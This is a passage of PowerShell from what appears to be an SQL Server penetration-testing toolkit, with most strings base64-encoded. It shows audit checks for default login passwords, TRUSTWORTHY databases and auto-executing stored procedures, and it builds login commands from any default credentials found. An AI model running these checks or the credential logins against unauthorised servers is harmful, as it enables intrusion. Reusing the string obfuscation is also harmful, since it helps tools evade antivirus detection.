    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Default SQL Server Login Password"
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABMAG8AZwBpAG4AIABQAGEAcwBzAHcAbwByAGQA')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB0AGEAcgBnAGUAdAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABpAG4AcwB0AGEAbgBjAGUAIABpAHMAIABjAG8AbgBmAGkAZwB1AHIAZQBkACAAdwBpAHQAaAAgAGEAIABkAGUAZgBhAHUAbAB0ACAAUwBRAEwAIABsAG8AZwBpAG4AIABhAG4AZAAgAHAAYQBzAHMAdwBvAHIAZAAgAHUAcwBlAGQAIABiAHkAIABhACAAYwBvAG0AbQBvAG4AIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgA=')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHMAdQByAGUAIABhAGwAbAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABsAG8AZwBpAG4AcwAgAGEAcgBlACAAcgBlAHEAdQBpAHIAZQBkACAAdABvACAAdQBzAGUAIABhACAAcwB0AHIAbwBuAGcAIABwAGEAcwBzAHcAbwByAGQALgAgAEMAbwBuAHMAaQBkAGUAcgAgAGkAbgBoAGUAcgBpAHQAaQBuAGcAIAB0AGgAZQAgAE8AUwAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAbwBsAGkAYwB5AC4A')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "Get-SQLQuery -Verbose -Instance $Instance -Q `"Select @@Version`" -Username test -Password test."
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBwAHcAbgB3AGkAawBpAC8AcAB3AG4AdwBpAGsAaQAuAGcAaQB0AGgAdQBiAC4AaQBvAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AdABlAGMAaAAvAGQAYgAvAG0AcwBzAHEAbAAuAG0AZAA=')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $Results = Get-SQLServerLoginDefaultPw -Verbose -Instance $Instance 
        if($Results){
            $IsVulnerable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            $IsExploitable = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
        }
        $Results | 
        % {
            $DefaultComputer = $_.Computer
            $DefaultInstance = $_.Instance
            $DefaultUsername = $_.Username
            $DefaultPassword = $_.Password
            $DefaultIsSysadmin = $_.IsSysadmin
            $Details = "Default credentials found: $DefaultUsername / $DefaultPassword (sysadmin: $DefaultIsSysadmin)."
            $ExploitCmd    = "Get-SQLQuery -Verbose -Instance $DefaultInstance -Q `"Select @@Version`" -Username $DefaultUsername -Password $DefaultPassword"
            $null = $TblData.Rows.Add($DefaultComputer, $DefaultInstance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                        
        }        
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Default SQL Server Login Password"
    }
    End
    {           
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function Invoke-SQLAuditPrivTrustworthy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABUAHIAdQBzAHQAdwBvAHIAdABoAHkAIABEAGEAdABhAGIAYQBzAGUA')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGUAIABvAHIAIABtAG8AcgBlACAAZABhAHQAYQBiAGEAcwBlACAAaQBzACAAYwBvAG4AZgBpAGcAdQByAGUAZAAgAGEAcwAgAHQAcgB1AHMAdAB3AG8AcgB0AGgAeQAuACAAIABUAGgAZQAgAFQAUgBVAFMAVABXAE8AUgBUAEgAWQAgAGQAYQB0AGEAYgBhAHMAZQAgAHAAcgBvAHAAZQByAHQAeQAgAGkAcwAgAHUAcwBlAGQAIAB0AG8AIABpAG4AZABpAGMAYQB0AGUAIAB3AGgAZQB0AGgAZQByACAAdABoAGUAIABpAG4AcwB0AGEAbgBjAGUAIABvAGYAIABTAFEATAAgAFMAZQByAHYAZQByACAAdAByAHUAcwB0AHMAIAB0AGgAZQAgAGQAYQB0AGEAYgBhAHMAZQAgAGEAbgBkACAAdABoAGUAIABjAG8AbgB0AGUAbgB0AHMAIAB3AGkAdABoAGkAbgAgAGkAdAAuACAAIABJAG4AYwBsAHUAZABpAG4AZwAgAHAAbwB0AGUAbgB0AGkAYQBsAGwAeQAgAG0AYQBsAGkAYwBpAG8AdQBzACAAYQBzAHMAZQBtAGIAbABpAGUAcwAgAHcAaQB0AGgAIABhAG4AIABFAFgAVABFAFIATgBBAEwAXwBBAEMAQwBFAFMAUwAgAG8AcgAgAFUATgBTAEEARgBFACAAcABlAHIAbQBpAHMAcwBpAG8AbgAgAHMAZQB0AHQAaQBuAGcALgAgAEEAbABzAG8ALAAgAHAAbwB0AGUAbgB0AGkAYQBsAGwAeQAgAG0AYQBsAGkAYwBpAG8AdQBzACAAbQBvAGQAdQBsAGUAcwAgAHQAaABhAHQAIABhAHIAZQAgAGQAZQBmAGkAbgBlAGQAIAB0AG8AIABlAHgAZQBjAHUAdABlACAAYQBzACAAaABpAGcAaAAgAHAAcgBpAHYAaQBsAGUAZwBlAGQAIAB1AHMAZQByAHMALgAgAEMAbwBtAGIAaQBuAGUAZAAgAHcAaQB0AGgAIABvAHQAaABlAHIAIAB3AGUAYQBrACAAYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAaQB0ACAAYwBhAG4AIABsAGUAYQBkACAAdABvACAAdQBzAGUAcgAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABhAG4AZAAgAGEAcgBiAGkAdAByAGEAcgB5ACAAYwBvAGQAZQAgAGUAeABlAGMAdABpAG8AbgAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIALgA=')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AZgBpAGcAdQByAGUAZAAgAHQAaABlACAAYQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlACAAcwBvACAAdABoAGUAIAAnAGkAcwBfAHQAcgB1AHMAdAB3AG8AcgB0AGgAeQBfAG8AbgAnACAAZgBsAGEAZwAgAGkAcwAgAHMAZQB0ACAAdABvACAAJwBmAGEAbABzAGUAJwAuACAAIABBACAAcQB1AGUAcgB5ACAAcwBpAG0AaQBsAGEAcgAgAHQAbwAgACcAQQBMAFQARQBSACAARABBAFQAQQBCAEEAUwBFACAATQB5AEEAcABwAHMARABiACAAUwBFAFQAIABUAFIAVQBTAFQAVwBPAFIAVABIAFkAIABPAE4AJwAgAGkAcwAgAHUAcwBlAGQAIAB0AG8AIABzAGUAdAAgAGEAIABkAGEAdABhAGIAYQBzAGUAIABhAHMAIAB0AHIAdQBzAHQAdwBvAHIAdABoAHkALgAgACAAQQAgAHEAdQBlAHIAeQAgAHMAaQBtAGkAbABhAHIAIAB0AG8AIAAnAEEATABUAEUAUgAgAEQAQQBUAEEAQgBBAFMARQAgAE0AeQBBAHAAcABEAGIAIABTAEUAVAAgAFQAUgBVAFMAVABXAE8AUgBUAEgAWQAgAE8ARgBGACcAIABjAGEAbgAgAGIAZQAgAHUAcwBlACAAdABvACAAdQBuAHMAZQB0ACAAaQB0AC4A')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABhAHQAIAB0AGgAaQBzACAAdABpAG0AZQAuAA==')))
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgANwA4ADYAMQAuAGEAcwBwAHgA')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $TrustedDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.DatabaseName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAYgA='))) -and $_.is_trustworthy_on -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAZQA=')))
        }
        if($TrustedDatabases)
        {
            $IsVulnerable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            $TrustedDatabases |
            % -Process {
                $DatabaseName = $_.DatabaseName
                Write-Verbose -Message "$Instance : - The database $DatabaseName was found configured as trustworthy."
                $Details = "The database $DatabaseName was found configured as trustworthy."
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No non-default trusted databases were found."
        }
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}
Function  Invoke-SQLAuditPrivAutoExecSp
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        $TblAutoExecPrivs = new-object System.Data.DataTable 
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEATgBhAG0AZQA=')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAGQAdQByAGUATgBhAG0AZQA=')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAGQAdQByAGUAVAB5AHAAZQA=')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAGQAdQByAGUARABlAGYAaQBuAGkAdABpAG8AbgA=')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAXwBEAEEAVABBAF8AQQBDAEMARQBTAFMA')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBPAFUAVABJAE4ARQBfAEIATwBEAFkA')))) | Out-Null    
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAEUARAA=')))) | Out-Null         
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABBAFMAVABfAEEATABUAEUAUgBFAEQA')))) | Out-Null    
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AbQBzAF8AcwBoAGkAcABwAGUAZAA=')))) | Out-Null   
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAF8AYQB1AHQAbwBfAGUAeABlAGMAdQB0AGUAZAA=')))) | Out-Null 
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA=')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAVAB5AHAAZQA=')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBpAHMAcwBpAG8AbgBOAGEAbQBlAA==')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABlAHIAbQBpAHMAcwBpAG8AbgBUAHkAcABlAA==')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgA=')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA=')))) | Out-Null
        $TblAutoExecPrivs.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQA=')))) | Out-Null
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure"
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not $TestConnection)
        {
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure."
            Return
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName
        if($Exploit)
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            $TestMode  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        $Vulnerability = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABBAHUAdABvACAARQB4AGUAYwB1AHQAZQAgAFMAdABvAHIAZQBkACAAUAByAG8AYwBlAGQAdQByAGUA')))
        $Description   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUAZAAgAGkAcwAgAGMAbwBuAGYAaQBnAHUAcgBlAGQAIABmAG8AcgAgAGEAdQB0AG8AbQBhAHQAaQBjACAAZQB4AGUAYwB1AHQAaQBvAG4AIABhAG4AZAAgAGgAYQBzACAAZQB4AHAAbABpAGMAaQB0ACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzACAAYQBzAHMAaQBnAG4AZQBkAC4AIAAgAFQAaABpAHMAIABtAGEAeQAgAGEAbABsAG8AdwAgAG4AbwBuACAAcwB5AHMAYQBkAG0AaQBuACAAbABvAGcAaQBuAHMAIAB0AG8AIABlAHgAZQBjAHUAdABlACAAcQB1AGUAcgBpAGUAcwAgAGEAcwAgACIAcwBhACIAIAB3AGgAZQBuACAAdABoAGUAIABTAFEATAAgAFMAZQByAHYAZQByACAAcwBlAHIAdgBpAGMAZQAgAGkAcwAgAHIAZQBzAHQAYQByAHQAZQBkAC4A')))
        $Remediation   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHMAdQByAGUAIAB0AGgAYQB0ACAAbgBvAG4AIABzAHkAcwBhAGQAbQBpAG4AIABsAG8AZwBpAG4AcwAgAGQAbwAgAG4AbwB0ACAAaABhAHYAZQAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIAB0AG8AIABBAEwAVABFAFIAIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlAHMAIABjAG8AbgBmAGkAZwB1AHIAZQBkACAAdwBpAHQAaAAgAHQAaABlACAAaQBzAF8AYQB1AHQAbwBfAGUAeABlAGMAdQB0AGUAZAAgAHMAZQB0AHQAdABpAG4AZwAgAHMAZQB0ACAAdABvACAAMQAuAA==')))
        $Severity      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABhAHQAIAB0AGgAaQBzACAAdABpAG0AZQAuAA==')))
        $Details       = ''
        $Reference     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgANwA4ADYAMQAuAGEAcwBwAHgA')))
        $Author        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        $IsVulnerable  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
        $AutoProcs = Get-SQLStoredProcedureAutoExec -Verbose -Instance $Instance -Username $username -Password $password -Credential $credential 
